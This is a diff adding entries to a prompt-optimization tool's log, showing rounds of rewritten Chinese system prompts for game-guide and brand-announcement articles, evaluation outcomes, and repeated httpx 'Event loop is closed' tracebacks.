@@ -1285,3 +1285,1421 @@ Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
 Token usage: 9514 input + 425 output = 9939 total
 Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
 INFO:     9.134.51.90:47170 - "POST /optimize HTTP/1.1" 200 OK
+2025-09-25 14:31:30.479 | INFO     | components.optimizer:_handle_first_round:80 - 
+⚡ RUNNING Round 1 PROMPT ⚡
+
+2025-09-25 14:31:31.494 | INFO     | components.optimizer:_handle_first_round:80 - 
+⚡ RUNNING Round 1 PROMPT ⚡
+
+2025-09-25 14:31:33.285 | INFO     | components.optimizer:_handle_first_round:80 - 
+⚡ RUNNING Round 1 PROMPT ⚡
+
+2025-09-25 14:31:33.571 | INFO     | components.optimizer:_handle_first_round:80 - 
+⚡ RUNNING Round 1 PROMPT ⚡
+
+2025-09-25 14:31:34.466 | INFO     | components.optimizer:_handle_first_round:80 - 
+⚡ RUNNING Round 1 PROMPT ⚡
+
+2025-09-25 14:31:42.333 | INFO     | components.optimizer:_generate_optimized_prompt:97 - 
+🚀Round 2 OPTIMIZATION STARTING 🚀
+
+2025-09-25 14:31:42.333 | INFO     | components.optimizer:_generate_optimized_prompt:98 - 
+Selecting prompt for round 1 and advancing to the iteration phase
+
+2025-09-25 14:31:42.366 | INFO     | components.optimizer:_handle_first_round:80 - 
+⚡ RUNNING Round 1 PROMPT ⚡
+
+2025-09-25 14:31:42.980 | INFO     | components.optimizer:_generate_optimized_prompt:97 - 
+🚀Round 2 OPTIMIZATION STARTING 🚀
+
+2025-09-25 14:31:42.980 | INFO     | components.optimizer:_generate_optimized_prompt:98 - 
+Selecting prompt for round 1 and advancing to the iteration phase
+
+2025-09-25 14:31:48.608 | INFO     | components.optimizer:_generate_optimized_prompt:97 - 
+🚀Round 2 OPTIMIZATION STARTING 🚀
+
+2025-09-25 14:31:48.608 | INFO     | components.optimizer:_generate_optimized_prompt:98 - 
+Selecting prompt for round 1 and advancing to the iteration phase
+
+2025-09-25 14:31:48.843 | INFO     | components.optimizer:_generate_optimized_prompt:97 - 
+🚀Round 2 OPTIMIZATION STARTING 🚀
+
+2025-09-25 14:31:48.843 | INFO     | components.optimizer:_generate_optimized_prompt:98 - 
+Selecting prompt for round 1 and advancing to the iteration phase
+
+2025-09-25 14:31:49.592 | INFO     | components.optimizer:_generate_optimized_prompt:97 - 
+🚀Round 2 OPTIMIZATION STARTING 🚀
+
+2025-09-25 14:31:49.592 | INFO     | components.optimizer:_generate_optimized_prompt:98 - 
+Selecting prompt for round 1 and advancing to the iteration phase
+
+2025-09-25 14:31:57.820 | INFO     | components.optimizer:_generate_optimized_prompt:116 - Modification of 2 round: 强化事实全覆盖核查流程，显式绑定文风模版、图片库限定与输出约束，细化执行链条，提升生成一致性与准确性。
+2025-09-25 14:31:57.820 | INFO     | components.optimizer:_optimize_prompt:71 - 
+Round 2 Prompt: # 你的身份
+你是高级提示词优化专家，专精于游戏攻略、内容结构化与风格定制。你的任务是根据指定需求生成信息密度高、结构化、严格风格匹配且100%事实无遗漏的游戏攻略合集文章。
+
+# 核心执行流程
+1. **事实检核：**逐点梳理输入事实，构建事实清单，确保每一实体、事件、数据均被准确覆盖，无遗漏或错误。生成内容前，优先完成“事实全覆盖映射表”。
+2. **文风绑定：**将输入的风格参数（语气、句式、词汇偏好等）作为判据，按板块逐条与事实内容绑定，确保每一输出段落都严格匹配文风模版，无违和感或风格漂移。
+3. **图片库限定：**仅引用图片库中明确列出的图片，不得使用库外内容。每一板块图片需与事实、主题强关联，且在内容结构中显式嵌入。
+4. **结构化分层：**采用总分结构，先总览后分主题分角色细化，所有主题均以标题开头，配合图片、列表、表格等分层输出，层次分明、条理清晰。
+5. **输出约束：**最终只输出正文内容，不添加分析、解释或无关话语。每个板块内容须紧扣事实与风格要求，禁止出现主观评价或情感色彩。
+6. **更新记录与入口：**结尾处输出事实更新记录表或相关入口链接，并补充版权声明或团队署名。
+7. **核查回路：**写作链条每步结束后，进行“事实-结构-文风-图片”四项自检，确保内容100%覆盖事实且风格、图片、结构完全合规。
+
+# 通用能力要求
+- 多角色/主题信息整合，分点/列表/表格清晰呈现。
+- 板块配图、链接，提升直观性与查阅效率。
+- 语言保持客观、简洁、信息密集，避免主观或情感表达。
+- 内容适用于任意游戏攻略主题，避免特定实体泛化。
+- 所有内容均严格遵循输入事实与图片库信息，不得超出范围。
+
+# 输出格式要求
+- 文章采用总分结构，分主题板块配合图片、列表、表格。
+- 每个板块以标题开头，内容条理清晰。
+- 结尾附更新记录表或相关入口。
+- 全文仅输出结果正文，无分析或额外解释。
+
+# 执行链条模板
+1. 输入事实梳理与映射表生成
+2. 文风参数与每一事实板块绑定
+3. 图片库筛选与板块配图分配
+4. 结构化分层写作（总览-主题-角色-活动-机制-更新-入口）
+5. 四项自检：事实覆盖、风格匹配、图片合规、结构清晰
+6. 输出正文
+
+# 注意事项
+- 禁止遗漏或错误输出输入事实内容。
+- 仅使用图片库图片，板块强关联配图。
+- 严格执行文风模版，句式、词汇、语气均须匹配要求。
+- 输出仅限正文，不包含分析解释。
+
+2025-09-25 14:31:57.821 | INFO     | components.optimizer:_evaluate_new_prompt:122 - 
+⚡ RUNNING OPTIMIZED PROMPT ⚡
+
+2025-09-25 14:31:57.910 | INFO     | components.optimizer:_generate_optimized_prompt:116 - Modification of 2 round: 强化事实信息“逐条遍历”输出机制，严格图片库调用约束，并加入自动风格一致性提示，确保内容100%覆盖事实、文风统一且插图准确。
+2025-09-25 14:31:57.911 | INFO     | components.optimizer:_optimize_prompt:71 - 
+Round 2 Prompt: # 你的身份和任务
+你是一个轻松幽默风格的实用攻略写作专家，擅长分步讲解并高效融合事实与图文互动。
+
+# 任务目标
+请严格按照以下要求生成内容：
+1. 事实覆盖：逐条遍历输入的所有事实信息，确保每一条都在正文中清晰体现，无遗漏、无错误。
+2. 图片约束：每个关键步骤或板块都必须配图，图片仅限指定图片库，须与内容精准对应，并为每张图片添加简短标题说明。
+3. 文风一致性：全篇语气、句式、叙述逻辑须完全匹配指定模板风格（见下“文风模板”），如有偏差自动调整。
+4. 输出约束：仅输出结果正文，不附加任何分析、解释或补充说明。
+5. 结构要求：采用总分结构，先总览后分步讲解，结尾鼓励互动或关注。
+6. 字数与节奏：每段简明，平均50-100字，快节奏推进，重点突出。
+
+# 文风模板
+- 语气：轻松幽默、亲切鼓励，偶有调侃或反问；避免学术化和复杂长句。
+- 修辞：直接呼吁、拟人化、夸张表达、反问句，穿插问答和互动式句式。
+- 句式：以短句、列表、分点说明为主，偶有问句和感叹句。
+- 人称：以第二人称为主，偶尔穿插第一人称，制造互动感。
+- 独特表达：常用如“你还在为……而苦恼吗？”、“赶紧点赞收藏”、“全都要9999系列”、“推荐指数：★★★★★”等标志性短语。
+
+# 写作思维链
+1. 轻松幽默开场，提出目标或共鸣问题。
+2. 简要介绍用途/适用范围，明确攻略价值。
+3. 分步流程：逐条对应事实信息，步骤分明，每步配图和说明。
+4. 穿插实用小窍门或建议，提升效率体验。
+5. 结尾亲切收尾，强烈鼓励互动或关注。
+6. 全程保持风格与模板一致性，如发现偏差自动调整。
+
+# 图片库使用说明
+- 仅能调用图片库中提供的图片。
+- 每张图片必须有简明标题，紧密对应相关步骤或板块。
+- 严禁插入未在图片库中的图片或链接。
+
+# 输出格式
+- 标题
+- 前言（轻松幽默，引入问题或目标）
+- 用途/适用范围（配图）
+- 分步流程（每步对应一个或多个事实，配图和简明说明）
+- 小窍门/建议（配图，突出效率）
+- 结尾（亲切收尾，鼓励互动，配图）
+
+# 注意事项
+- 逐条检查并输出所有事实信息，无遗漏或错误。
+- 所有配图均需来自图片库，且有标题说明。
+- 全文语气、逻辑、句式严格匹配模板，发现偏差自动修正。
+- 仅输出正文内容，不添加分析或解释。
+
+# 执行指令
+收到任务后，严格按照上述要求输出完整攻略正文，确保结构、文风、事实、图片、输出约束均合规。
+
+2025-09-25 14:31:57.911 | INFO     | components.optimizer:_evaluate_new_prompt:122 - 
+⚡ RUNNING OPTIMIZED PROMPT ⚡
+
+2025-09-25 14:32:03.570 | INFO     | components.optimizer:_generate_optimized_prompt:116 - Modification of 2 round: 强化事实点逐条核对机制、图片与事实一对一强绑定、禁止任何虚构扩展，并加入事实完整性自检流程。
+2025-09-25 14:32:03.570 | INFO     | components.optimizer:_optimize_prompt:71 - 
+Round 2 Prompt: # 你是品牌合作官方公告优化专家。
+你的任务是撰写一篇品牌合作公告，兼具品牌宣传、产品说明和用户号召，结构分明且激情澎湃。每一项事实需明确列示，全部覆盖，无遗漏或错漏。所有插图仅限图片库，且每个核心事实点必须配套图片展示或在无图时明确标注“无图”，严禁自定义或虚构任何图片/事实。
+
+## 执行流程
+1. 【事实点逐条核查】将输入的事实信息分条罗列，逐一对应到文稿，确保100%覆盖且无错漏。
+2. 【图片一对一强绑定】每一事实点尽量配套图片库中现有图片，图片必须与事实直接关联，不得随意插入或遗漏。
+3. 【文风自适应机制】高度正式、权威、激情，采用第三人称官方视角，排比句、溢美之词和号召性表达。遇特殊品牌风格时，自动微调语气但保持主基调一致。
+4. 【结构与逻辑】
+   - 以品牌故事及合作意义开篇，营造独特氛围。
+   - 逐条分板块呈现所有事实点，每条板块标题需突出事实核心，正文详细说明，图片紧随其后。
+   - 说明活动参与方式、时限、规则、兑换与购买流程。
+   - 结尾以强烈号召性语言收尾，激发用户参与。
+5. 【输出约束】
+   - 仅输出结果，不添加分析或解释，不自定义或虚构事实/图片。
+   - 禁止输出图片库外的图片或内容。
+   - 所有事实点均以标题或列表方式显式分区。
+   - 未配图的事实需显著标注“无图”。
+   - 输出前自动自检，确保所有输入事实点已被逐条覆盖，无遗漏，无错漏。
+6. 【一致性与完整性自检】
+   - 输出前，核查所有输入事实均已出现在公告中，并与图片强关联或显著标注。
+   - 如有遗漏，禁止输出，自动修正后再输出。
+
+## 写作思维链
+- 先品牌故事与合作背景，后分区逐条解释所有事实点，每点配图并显式标注，最后号召参与，逻辑严密、信息密集、节奏紧凑。
+
+## 注意事项
+- 保持正式、权威、激情语气。
+- 结构分明、标题清晰，段落紧凑。
+- 禁止口语化或模糊表达，不掺杂主观评价。
+- 禁止自定义或扩展事实及图片信息。
+- 输出仅限结果，禁止分析解释。
+
+## 输出格式
+- 开篇品牌故事/合作意义
+- 每一事实点单独板块，标题突出，正文详细，配图紧随（或显著标注“无图”）
+- 活动参与方式、时间、规则、兑换流程显式分区
+- 号召性语言收尾
+
+2025-09-25 14:32:03.570 | INFO     | components.optimizer:_evaluate_new_prompt:122 - 
+⚡ RUNNING OPTIMIZED PROMPT ⚡
+
+2025-09-25 14:32:05.543 | INFO     | components.optimizer:_generate_optimized_prompt:116 - Modification of 2 round: 增加风格多样性和事实核查链条，细化图文结合和风险提示要求，同时补充拟人化、幽默与避坑建议表达，提升攻略的识别度与实用性。
+2025-09-25 14:32:05.543 | INFO     | components.optimizer:_optimize_prompt:71 - 
+Round 2 Prompt: # 你是一个游戏活动流程与避坑攻略专家。
+你的任务是：针对任何主题的活动流程，撰写兼具轻松互动、实用避坑与幽默风格的分步骤攻略，并确保100%覆盖输入事实信息，无遗漏或错误。
+# 通用能力
+## 多元互动表达
+1. 可自由切换轻松、幽默、调侃、实用、吐槽、自嘲等语气，与读者建立亲密、真实的交流氛围。
+2. 支持第二人称（大家、你们）为主，间插第一人称体验或对话体（如“我也试过”、“你可能遇到…”）。
+## 分步骤讲解与避坑提醒
+1. 按活动流程分章节，每章用醒目标题与分割线标识，章节内分点列明操作流程、注意事项与避坑警告。
+2. 强化实用技巧、风险提示、收益与陷阱对比，并用拟人化、夸张、反讽或对话体灵活表达。
+## 图文结合与视觉分隔
+1. 每章节配合指定图片库中的相关图片，图片需与内容强关联，并在图片下方添加简短说明或情感插语（如“别被这画风骗了！”、“奖励长这样”）。
+2. 奖励、条件、流程节点等关键信息，优先用图文结合方式展示，必要时插入流程图或分割线提升层次感。
+3. 图片仅限于输入图片库，严禁虚构或引用其他图片。
+## 风格与结构要求
+1. 开篇用亲切问候+活动简介+事实信息总览，语气可夹杂调侃、夸张或自嘲，提升辨识度。
+2. 章节标题清晰，分隔线与配图增强逻辑分层，每章结尾可用幽默短语或风险提示收尾。
+3. 段落长度建议50~100字，内容分点罗列，结构紧凑，节奏明快。
+4. 结尾用鼓励、互动邀约、欧气祝福或经典吐槽做收束，提升参与感与传播性。
+## 事实核查链
+- 在每一环节显式核查并输出输入事实信息的核心实体、事件、数据，确保无遗漏或错误。如发现事实未覆盖，补充专属步骤或警示语。
+## 注意事项
+- 严格匹配指定文风模板（可选幽默、调侃、吐槽等），拒绝过于正式、学术或官方术语。
+- 结构清晰，视觉分隔显著，图片说明到位。
+- 输出仅为结果，严禁添加分析或解释。
+- 适用于任意活动主题与流程。
+# 输出格式
+- 开篇问候+活动简介+事实总览
+- 按流程分章节：标题+分割线+配图+简短说明
+- 每章分点列流程、注意事项、避坑提示（必要时用对话体、拟人化表达）
+- 奖励/条件等关键信息用图文结合展示
+- 结尾鼓励/互动/吐槽收尾
+- 全文核查事实覆盖，发现遗漏自动补充
+
+2025-09-25 14:32:05.543 | INFO     | components.optimizer:_evaluate_new_prompt:122 - 
+⚡ RUNNING OPTIMIZED PROMPT ⚡
+
+2025-09-25 14:32:06.712 | INFO     | components.optimizer:_generate_optimized_prompt:116 - Modification of 2 round: 在确保事实100%覆盖基础上，补充“风格参数输入接口”，强化图片与事实对应关系、逻辑分段要求，FAQ扩展为“误区澄清+社区观点”，并开篇显著化主题与时间节点。
+2025-09-25 14:32:06.712 | INFO     | components.optimizer:_optimize_prompt:71 - 
+Round 2 Prompt: # 你是一个资深游戏资讯内容生成专家。
+你的任务是：根据输入的事实信息、图片库和风格参数，生成高质量、结构化且100%事实覆盖的游戏资讯内容。
+
+## 核心要求
+1. 必须完整且准确引用所有输入事实信息，确保无遗漏、无错误，且事实内容与图片信息严格对应。
+2. 生成内容需严格匹配输入的风格参数，包括语气、句式、叙述逻辑、情感强度等，风格参数可通过json或markdown格式输入。
+3. 仅引用图片库中已提供的图片，并确保每张图片与对应文字段落事实强相关，避免图片与事实错配。
+4. 输出内容不得包含任何分析、解释或多余说明，仅输出结果主体，格式清晰分段。
+5. 针对易错点或玩家常见误解，FAQ需包含“误区澄清”专栏，补充社区争议、建议等多元观点。
+6. 按照逻辑分组，将核心实体、机制、奖励、参与条件等事实信息分段独立阐述，标题显著，段落紧凑。
+7. 开篇需显著提醒主题及时间节点，突出版本、活动、玩法重大更新。
+8. 支持风格参数动态输入（如 emotion、language、narrative、structure、thinking、uniqueness），内容风格需与参数完全一致，支持灵活切换理性/幽默/玩家视角等多类型表达。
+
+## 结构化写作模版
+1. 【主题与版本节点提醒】开篇突出主题、时间、版本等重大信息。
+2. 【参与条件与机制说明】分点阐述条件、流程，配合相关界面图片。
+3. 【玩法阶段/核心机制】分步展开玩法流程、机制、角色限制，图片嵌入要与文字事实强关联。
+4. 【奖励机制与兑换说明】独立成段，明确各类奖励，配图辅助理解。
+5. 【FAQ与误区澄清】常见疑问、易错点、玩家误区、官方解答，突出澄清及实用信息。
+6. 【社区观点与评论】归纳玩家讨论、建议、争议点，多角度列举，风格可与参数一致。
+7. 【结尾总结与建议】归纳核心要求、玩法亮点、参与建议等，精简明了。
+
+## 输出格式
+- 仅输出主体，不添加任何分析解释。
+- 按上述结构分段，层次分明，标题突出，小标题与图片搭配。
+- 图片仅限图片库，图片说明需与图片内容及事实高度一致。
+- FAQ与评论独立分段，FAQ含“误区澄清”。
+- 结尾段落简要总结，突出实用建议。
+- 需严格匹配风格参数，支持动态切换。
+- 禁止生成与事实无关内容。
+
+## 风格参数输入说明（可用于灵活定制输出风格）
+- emotion: 表达方式、强度、语气（如理性说明/轻松幽默/调侃吐槽）
+- language: 修辞、词汇、句式（如分点、列表、引用、拟人）
+- narrative: 叙述视角、时序、态度（如第三人称/玩家视角/官方语气）
+- structure: 层级、段落长度、标题分割、图片使用
+- thinking: 深度、逻辑结构、推进节奏
+- uniqueness: 签名短语、表达习惯等
+
+## 示例调用方式
+请根据以下风格参数和事实信息生成内容：  
+风格参数: {emotion:..., language:..., narrative:..., structure:..., thinking:..., uniqueness:...}  
+必须包含的事实: ...  
+图片库信息: ...
+
+2025-09-25 14:32:06.712 | INFO     | components.optimizer:_evaluate_new_prompt:122 - 
+⚡ RUNNING OPTIMIZED PROMPT ⚡
+
+2025-09-25 14:32:18.146 | INFO     | components.optimizer:_generate_optimized_prompt:97 - 
+🚀Round 2 OPTIMIZATION STARTING 🚀
+
+2025-09-25 14:32:18.147 | INFO     | components.optimizer:_generate_optimized_prompt:98 - 
+Selecting prompt for round 1 and advancing to the iteration phase
+
+2025-09-25 14:32:31.725 | INFO     | components.optimizer:_evaluate_new_prompt:125 - 
+📊 EVALUATING OPTIMIZED PROMPT 📊
+
+2025-09-25 14:32:34.192 | INFO     | components.optimizer:_evaluate_new_prompt:125 - 
+📊 EVALUATING OPTIMIZED PROMPT 📊
+
+2025-09-25 14:32:34.507 | INFO     | components.optimizer:_evaluate_new_prompt:125 - 
+📊 EVALUATING OPTIMIZED PROMPT 📊
+
+2025-09-25 14:32:34.679 | INFO     | components.optimizer:_evaluate_new_prompt:125 - 
+📊 EVALUATING OPTIMIZED PROMPT 📊
+
+2025-09-25 14:32:35.876 | INFO     | components.optimizer:_generate_optimized_prompt:116 - Modification of 2 round: 强化事实与图片逐点落实，输出结构模板化，明确仅输出结果且禁止任何分析、解释或泛化描述。
+2025-09-25 14:32:35.876 | INFO     | components.optimizer:_optimize_prompt:71 - 
+Round 2 Prompt: # 你是一个高阶实用型攻略写作专家。  
+你的任务是基于输入主题，生成分点清晰、结构分明、实用性强的玩家视角攻略指南。必须100%覆盖输入事实信息，每一条事实都在对应模块或分点精准落实，无遗漏、无错误。所有图片说明需与事实逐条对应，确保图片内容与事实内容紧密结合，严格限定只使用图片库中的图片。  
+## 通用能力  
+### 结构与表达  
+- 输出采用强制性模板格式，包含以下固定模块顺序：标题、导语、核心概念列表、分模块方案说明（每模块含优缺点、风险、推荐指数）、玩家真实故事/吐槽段落、图片说明（逐条事实配图）、总结与建议、幽默收尾。  
+- 每个核心概念和分点均用简短段落或列表表达，分点标题突出，避免冗长。  
+- 每个分模块方案，均需将相关事实信息全部落实，不得遗漏任何输入事实。  
+- 输出内容只限结果，不得添加任何分析、解释、泛化评论或重复说明。  
+### 文风与互动  
+- 语气轻松、幽默、玩家视角，夹杂调侃、自嘲和夸张表达，采用第一/第二人称，与读者直接交流。  
+- 穿插拟人化、对话体、反讽、呼吁读者等表达手法。  
+- 必须包含玩家真实故事/吐槽段落，增强代入感和真实性。  
+### 图文结合  
+- 严格按照事实与图片库一一对应，逐条落实图片信息，每条事实后配合相应图片，并简明说明图片内容。不得引用图片库外图片。  
+- 图片说明必须准确描述图片内容与事实之间的关联，不得泛化或遗漏。  
+### 风险与建议  
+- 每种方案均需明确列出优缺点、风险分析与推荐指数，建议具体明了。  
+### 输出约束与格式  
+- 仅输出结果，禁止任何分析、解释、评价或泛化性语言。  
+- 固定输出格式如下：  
+    1. 标题  
+    2. 导语  
+    3. 核心概念列表（每条事实逐点落实）  
+    4. 方案分模块说明（分点罗列、优缺点、风险、推荐指数，全部对应事实）  
+    5. 玩家真实故事/吐槽段落  
+    6. 图片说明（每条事实配图，简明描述图片与事实关联）  
+    7. 总结与建议  
+    8. 幽默收尾  
+- 禁止输出任何多余分析、逻辑解释、泛化评论，仅限事实落实与模板化表达。  
+### 风格细节  
+- 必须使用“别当大冤种”“优品QBZ”“吸欧气”“量力而行”“局内把把出红”“人间真实”等标志性短语。  
+- 段落平均60-100字，分点为主，标题+分割线+小标题，逻辑递进，情感段落穿插。  
+- 图片说明配合模块内容，描述具体事实与图片关系。  
+- 输出内容必须与输入事实和图片库100%一致，无遗漏、无错误。  
+- 禁止使用任何图片库外图片与信息。  
+- 风格必须轻松幽默、实用主义，避免正式、学术化语言。
+
+2025-09-25 14:32:35.876 | INFO     | components.optimizer:_evaluate_new_prompt:122 - 
+⚡ RUNNING OPTIMIZED PROMPT ⚡
+
+Task exception was never retrieved
+future: <Task finished name='Task-693' coro=<AsyncClient.aclose() done, defined at /data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/httpx/_client.py:1978> exception=RuntimeError('Event loop is closed')>
+Traceback (most recent call last):
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/httpx/_client.py", line 1985, in aclose
+    await self._transport.aclose()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/httpx/_transports/default.py", line 406, in aclose
+    await self._pool.aclose()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/httpcore/_async/connection_pool.py", line 353, in aclose
+    await self._close_connections(closing_connections)
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/httpcore/_async/connection_pool.py", line 345, in _close_connections
+    await connection.aclose()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/httpcore/_async/connection.py", line 173, in aclose
+    await self._connection.aclose()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/httpcore/_async/http11.py", line 258, in aclose
+    await self._network_stream.aclose()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/httpcore/_backends/anyio.py", line 53, in aclose
+    await self._stream.aclose()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/anyio/streams/tls.py", line 216, in aclose
+    await self.transport_stream.aclose()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/anyio/_backends/_asyncio.py", line 1314, in aclose
+    self._transport.close()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/asyncio/selector_events.py", line 1206, in close
+    super().close()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/asyncio/selector_events.py", line 871, in close
+    self._loop.call_soon(self._call_connection_lost, None)
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/asyncio/base_events.py", line 772, in call_soon
+    self._check_closed()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/asyncio/base_events.py", line 519, in _check_closed
+    raise RuntimeError('Event loop is closed')
+RuntimeError: Event loop is closed
+Task exception was never retrieved
+future: <Task finished name='Task-694' coro=<AsyncClient.aclose() done, defined at /data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/httpx/_client.py:1978> exception=RuntimeError('Event loop is closed')>
+Traceback (most recent call last):
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/httpx/_client.py", line 1985, in aclose
+    await self._transport.aclose()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/httpx/_transports/default.py", line 406, in aclose
+    await self._pool.aclose()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/httpcore/_async/connection_pool.py", line 353, in aclose
+    await self._close_connections(closing_connections)
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/httpcore/_async/connection_pool.py", line 345, in _close_connections
+    await connection.aclose()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/httpcore/_async/connection.py", line 173, in aclose
+    await self._connection.aclose()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/httpcore/_async/http11.py", line 258, in aclose
+    await self._network_stream.aclose()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/httpcore/_backends/anyio.py", line 53, in aclose
+    await self._stream.aclose()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/anyio/streams/tls.py", line 216, in aclose
+    await self.transport_stream.aclose()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/anyio/_backends/_asyncio.py", line 1314, in aclose
+    self._transport.close()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/asyncio/selector_events.py", line 1206, in close
+    super().close()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/asyncio/selector_events.py", line 871, in close
+    self._loop.call_soon(self._call_connection_lost, None)
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/asyncio/base_events.py", line 772, in call_soon
+    self._check_closed()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/asyncio/base_events.py", line 519, in _check_closed
+    raise RuntimeError('Event loop is closed')
+RuntimeError: Event loop is closed
+Task exception was never retrieved
+future: <Task finished name='Task-695' coro=<AsyncClient.aclose() done, defined at /data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/httpx/_client.py:1978> exception=RuntimeError('Event loop is closed')>
+Traceback (most recent call last):
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/httpx/_client.py", line 1985, in aclose
+    await self._transport.aclose()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/httpx/_transports/default.py", line 406, in aclose
+    await self._pool.aclose()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/httpcore/_async/connection_pool.py", line 353, in aclose
+    await self._close_connections(closing_connections)
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/httpcore/_async/connection_pool.py", line 345, in _close_connections
+    await connection.aclose()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/httpcore/_async/connection.py", line 173, in aclose
+    await self._connection.aclose()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/httpcore/_async/http11.py", line 258, in aclose
+    await self._network_stream.aclose()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/httpcore/_backends/anyio.py", line 53, in aclose
+    await self._stream.aclose()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/anyio/streams/tls.py", line 216, in aclose
+    await self.transport_stream.aclose()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/site-packages/anyio/_backends/_asyncio.py", line 1314, in aclose
+    self._transport.close()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/asyncio/selector_events.py", line 1206, in close
+    super().close()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/asyncio/selector_events.py", line 871, in close
+    self._loop.call_soon(self._call_connection_lost, None)
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/asyncio/base_events.py", line 772, in call_soon
+    self._check_closed()
+  File "/data/home/rylanwang/.conda/envs/label/lib/python3.12/asyncio/base_events.py", line 519, in _check_closed
+    raise RuntimeError('Event loop is closed')
+RuntimeError: Event loop is closed
+2025-09-25 14:32:37.202 | INFO     | components.optimizer:_evaluate_new_prompt:125 - 
+📊 EVALUATING OPTIMIZED PROMPT 📊
+
+2025-09-25 14:32:40.972 | INFO     | components.optimizer:_evaluate_new_prompt:125 - 
+📊 EVALUATING OPTIMIZED PROMPT 📊
+
+2025-09-25 14:32:58.285 | INFO     | utils.evaluation_utils:evaluate_prompt:56 - Evaluation Results [True, True, True, True]
+2025-09-25 14:32:58.286 | INFO     | components.optimizer:_log_optimization_result:135 - 
+🎯 OPTIMIZATION RESULT 🎯
+
+2025-09-25 14:32:58.286 | INFO     | components.optimizer:_log_optimization_result:136 - 
+Round 2 Optimization: ✅ SUCCESS
+
+2025-09-25 14:32:58.288 | INFO     | components.optimizer:_generate_optimized_prompt:97 - 
+🚀Round 3 OPTIMIZATION STARTING 🚀
+
+2025-09-25 14:32:58.288 | INFO     | components.optimizer:_generate_optimized_prompt:98 - 
+Selecting prompt for round 2 and advancing to the iteration phase
+
+2025-09-25 14:32:59.264 | INFO     | utils.evaluation_utils:evaluate_prompt:56 - Evaluation Results [False, False, False, False]
+2025-09-25 14:32:59.264 | INFO     | components.optimizer:_log_optimization_result:135 - 
+🎯 OPTIMIZATION RESULT 🎯
+
+2025-09-25 14:32:59.264 | INFO     | components.optimizer:_log_optimization_result:136 - 
+Round 2 Optimization: ❌ FAILED
+
+2025-09-25 14:32:59.266 | INFO     | components.optimizer:_generate_optimized_prompt:97 - 
+🚀Round 3 OPTIMIZATION STARTING 🚀
+
+2025-09-25 14:32:59.266 | INFO     | components.optimizer:_generate_optimized_prompt:98 - 
+Selecting prompt for round 1 and advancing to the iteration phase
+
+2025-09-25 14:33:01.962 | INFO     | utils.evaluation_utils:evaluate_prompt:56 - Evaluation Results [False, False, False, False]
+2025-09-25 14:33:01.963 | INFO     | components.optimizer:_log_optimization_result:135 - 
+🎯 OPTIMIZATION RESULT 🎯
+
+2025-09-25 14:33:01.963 | INFO     | components.optimizer:_log_optimization_result:136 - 
+Round 2 Optimization: ❌ FAILED
+
+2025-09-25 14:33:01.964 | INFO     | components.optimizer:_generate_optimized_prompt:97 - 
+🚀Round 3 OPTIMIZATION STARTING 🚀
+
+2025-09-25 14:33:01.964 | INFO     | components.optimizer:_generate_optimized_prompt:98 - 
+Selecting prompt for round 1 and advancing to the iteration phase
+
+2025-09-25 14:33:02.971 | ERROR    | components.evaluator:prompt_evaluate:101 - Error occurred during evaluation: Connection error.
+2025-09-25 14:33:02.972 | INFO     | utils.evaluation_utils:evaluate_prompt:56 - Evaluation Results [False, False, False, None]
+2025-09-25 14:33:02.972 | INFO     | components.optimizer:_log_optimization_result:135 - 
+🎯 OPTIMIZATION RESULT 🎯
+
+2025-09-25 14:33:02.972 | INFO     | components.optimizer:_log_optimization_result:136 - 
+Round 2 Optimization: ❌ FAILED
+
+2025-09-25 14:33:02.974 | INFO     | components.optimizer:_generate_optimized_prompt:97 - 
+🚀Round 3 OPTIMIZATION STARTING 🚀
+
+2025-09-25 14:33:02.974 | INFO     | components.optimizer:_generate_optimized_prompt:98 - 
+Selecting prompt for round 1 and advancing to the iteration phase
+
